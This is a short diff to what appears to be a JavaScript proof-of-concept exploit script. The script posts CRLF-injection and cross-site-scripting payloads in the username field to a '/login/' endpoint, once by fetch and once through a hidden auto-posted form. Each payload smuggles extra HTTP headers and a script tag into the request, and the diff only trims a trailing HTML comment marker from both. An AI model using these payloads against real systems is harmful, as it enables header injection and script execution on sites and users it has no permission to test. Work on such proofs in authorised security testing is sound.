@@ -55,7 +55,7 @@ async function run() {
   var crlfWorked = false;
   try {
     var payload = new URLSearchParams();
-    payload.set('username', 'admin_xss\r\nInjected-Header: CRLF-PROOF\r\n\r\n<script>alert(document.domain)</script><!--');
+    payload.set('username', 'admin_xss\r\nInjected-Header: CRLF-PROOF\r\n\r\n<script>alert(document.domain)</script>');
     payload.set('password', 'test');
     var r = await fetch(BASE + '/login/', {method: 'POST', body: payload, mode: 'cors'});
     log('Status: ' + r.status + ' ' + r.statusText, r.ok ? '#0f0' : '#f00');
@@ -85,7 +85,7 @@ async function run() {
   form.target = 'xf';
   var u = document.createElement('input');
   u.type = 'hidden'; u.name = 'username';
-  u.value = 'admin_xss\r\nContent-Type: text/html\r\n\r\n<script>document.write("XSS on "+document.domain)</script><!--';
+  u.value = 'admin_xss\r\nContent-Type: text/html\r\n\r\n<script>document.write("XSS on "+document.domain)</script>';
   var p = document.createElement('input');
   p.type = 'hidden'; p.name = 'password'; p.value = 'test';
   form.appendChild(u); form.appendChild(p);
